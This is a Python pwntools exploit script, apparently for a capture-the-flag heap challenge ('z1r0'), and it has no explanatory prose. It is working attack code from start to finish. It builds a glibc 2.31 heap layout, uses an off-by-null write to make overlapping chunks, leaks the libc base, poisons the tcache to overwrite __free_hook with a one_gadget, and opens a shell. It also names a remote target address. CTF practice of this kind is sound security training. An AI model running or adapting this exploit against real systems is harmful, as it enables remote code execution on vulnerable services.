from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './z1r0'

debug = 0
if debug:
    r = remote('121.36.194.21', 49153)
else:
    r = process(file_name)

elf = ELF(file_name)

libc = ELF('libc-2.31.so')

menu = 'cmd: '

def dbg():
    gdb.attach(r)

def add(size):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Size: ', str(size))

def edit(index, content):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Note: ', content)

def show(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))

def delete(index):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))

r.recvuntil('username: ')
r.sendline('aaaa')

add(0x418) #0
add(0x128) #1
add(0x418) #2
add(0x438) #3 
add(0x148) #4
add(0x428) #5
add(0x138) #6

delete(0)
delete(3)
delete(5)

delete(2)       #2,3

add(0x438)  #0

edit(0, b'a' * 0x418 + p64(0xb01)[:7])

add(0x418)  #2

add(0x428)  #3

add(0x418)  #5

delete(5)
delete(2)

add(0x418)  #2

show(2)

libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x1ebbe0
success('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
success('free_hook = ' + hex(free_hook))
one = [0xe6c7e, 0xe6c81, 0xe6c84]
one_gadget = one[1] + libc_base

edit(2,b'\x01' * 8)
add(0x418)  # 5 c20
delete(5)
delete(3)
add(0x5f8)  # 3 chunk into largebin
add(0x428)  # 5 partial overwrite fd
edit(5,b'')
add(0x418)  # 7 c20


add(0x108) #8 gap
edit(8,p64(0) + p64(0x111))
edit(6, b'\x01' * 0x138) #offbynull
edit(6, b'\x01' * 0x130 + p64(0xb00)) #prev_size
delete(3)
##
edit(1, p64(0))
add(0x10) #3


add(0x128) #9
delete(1)
delete(9)
edit(7,p64(free_hook))

add(0x128)
add(0x128) #9

edit(9,p64(one_gadget))


delete(0)



r.interactive()
